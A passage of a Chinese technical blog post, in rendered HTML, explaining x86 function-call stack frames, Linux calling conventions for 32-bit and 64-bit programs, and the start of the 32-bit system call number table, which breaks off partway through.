</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:13.5601em;vertical-align:-6.53em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:7.03em;"><span style="top:-9.69em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-7.58em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-5.49em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-3.99em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-1.83em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:0.28em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:2.37em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.53em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:7.03em;"><span style="top:-9.8775em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">push args</span></span></span></span><span style="top:-7.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">call func</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">push next_eip</span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">jmp func</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-5.6775em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">push ebp</span></span></span></span><span style="top:-4.1775em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">mov ebp,esp</span></span></span></span><span style="top:-2.0175em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:0.0925em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">leave</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">mov esp,ebp</span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord">pop ebp</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:2.1825em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">ret</span></span><span class="mspace"> </span><span class="mord text"><span class="mord">(pop eip)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.53em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
<h2 id="函数参数传递">函数参数传递</h2>

  <div class="note p-4 mb-4 rounded-small red icon-padding">
    <i class="note-icon fa-solid fa-bolt"></i><p>注意：通常 linux 下的程序的函数调用都是外平栈的。</p>

  </div>
<h3 id="位程序">32位程序</h3>
<ul>
<li>普通函数传参：参数基本都压在栈上（有寄存器传参的情况，可查阅相关资料）。</li>
<li><code>int 0x80</code>
传参：eax对应系统调用号，ebx、ecx、edx、esi、edi、ebp
分别对应前六个参数多余的参数压在栈上。</li>
</ul>
<h3 id="位程序-1">64位程序：</h3>
<ul>
<li>普通函数传参：先使用 rdi、rsi、rdx、rcx、r8、r9
寄存器作为函数参数的前六个参数，多余的参数会依次压在栈上。</li>
<li><code>syscall</code> 传参：rax
对应系统调用号，传参规则与普通函数传参一致。 ## 系统调用号 ### 32 位
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _ASM_X86_UNISTD_32_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _ASM_X86_UNISTD_32_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_restart_syscall 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fork 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_read 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_write 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_close 6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitpid 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_creat 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_link 9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlink 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execve 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chdir 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_time 13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknod 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chmod 15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_break 17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldstat 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lseek 19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpid 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mount 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid 23</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stime 25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ptrace 26</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_alarm 27</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldfstat 28</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pause 29</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utime 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stty 31</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gtty 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_access 33</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nice 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftime 35</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync 36</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kill 37</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rename 38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdir 39</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rmdir 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup 41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe 42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_times 43</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prof 44</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_brk 45</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid 46</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid 47</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signal 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid 49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid 50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_acct 51</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount2 52</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lock 53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioctl 54</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl 55</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mpx 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpgid 57</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ulimit 58</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldolduname 59</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umask 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chroot 61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ustat 62</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup2 63</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getppid 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgrp 65</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsid 66</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaction 67</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sgetmask 68</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ssetmask 69</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid 70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid 71</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigsuspend 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigpending 73</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sethostname 74</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setrlimit 75</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrlimit 76</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrusage 77</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 78</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_settimeofday 79</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups 81</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_select 82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlink 83</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_oldlstat 84</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlink 85</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uselib 86</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapon 87</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_reboot 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readdir 89</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap 90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munmap 91</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate 92</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate 93</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmod 94</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown 95</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpriority 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpriority 97</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_profil 98</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs 99</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioperm 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketcall 102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syslog 103</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setitimer 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getitimer 105</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat 106</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat 107</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat 108</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_olduname 109</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_iopl 110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vhangup 111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_idle 112</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vm86old 113</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_wait4 114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapoff 115</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysinfo 116</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ipc 117</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsync 118</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigreturn 119</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clone 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setdomainname 121</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uname 122</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_modify_ldt 123</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_adjtimex 124</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mprotect 125</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigprocmask 126</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_create_module 127</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_init_module 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_delete_module 129</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_kernel_syms 130</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_quotactl 131</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgid 132</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchdir 133</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bdflush 134</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysfs 135</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_personality 136</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_afs_syscall 137</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid 138</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid 139</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__llseek 140</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents 141</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__newselect 142</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flock 143</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msync 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readv 145</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_writev 146</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsid 147</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fdatasync 148</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__sysctl 149</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock 150</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlock 151</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlockall 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlockall 153</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setparam 154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getparam 155</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setscheduler 156</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getscheduler 157</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_yield 158</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_max 159</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_min 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_rr_get_interval 161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nanosleep 162</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mremap 163</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid 164</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid 165</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vm86 166</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_query_module 167</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_poll 168</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nfsservctl 169</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid 171</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prctl 172</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigreturn 173</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigaction 174</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigprocmask 175</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigpending 176</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigtimedwait 177</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigqueueinfo 178</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigsuspend 179</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pread64 180</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwrite64 181</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown 182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcwd 183</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capget 184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capset 185</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaltstack 186</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile 187</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpmsg 188</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_putpmsg 189</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vfork 190</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ugetrlimit 191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mmap2 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate64 193</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate64 194</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_stat64 195</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lstat64 196</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstat64 197</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown32 198</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid32 199</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid32 200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid32 201</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid32 202</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid32 203</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid32 204</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups32 205</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups32 206</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown32 207</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid32 208</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid32 209</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid32 210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid32 211</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown32 212</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid32 213</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid32 214</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid32 215</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid32 216</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pivot_root 217</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mincore 218</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_madvise 219</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents64 220</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl64 221</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettid 224</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readahead 225</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setxattr 226</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lsetxattr 227</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsetxattr 228</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getxattr 229</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lgetxattr 230</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fgetxattr 231</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listxattr 232</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_llistxattr 233</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flistxattr 234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_removexattr 235</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lremovexattr 236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fremovexattr 237</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tkill 238</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile64 239</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futex 240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setaffinity 241</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getaffinity 242</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_thread_area 243</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_thread_area 244</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_setup 245</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_destroy 246</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_getevents 247</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_submit 248</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_cancel 249</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64 250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit_group 252</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lookup_dcookie 253</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create 254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl 255</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_remap_file_pages 257</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_tid_address 258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_create 259</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_settime 260</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_gettime 261</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_getoverrun 262</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_delete 263</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_settime 264</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_gettime 265</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_getres 266</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_nanosleep 267</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs64 268</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs64 269</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tgkill 270</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimes 271</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64_64 272</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vserver 273</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mbind 274</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_mempolicy 275</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_mempolicy 276</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_open 277</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_unlink 278</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedsend 279</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedreceive 280</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_notify 281</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_getsetattr 282</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_load 283</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitid 284</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_add_key 286</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_request_key 287</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_keyctl 288</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_set 289</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_get 290</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init 291</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_add_watch 292</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_rm_watch 293</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_migrate_pages 294</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_openat 295</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdirat 296</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknodat 297</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchownat 298</span></span><br><span class="line"><span class="meta">#<span 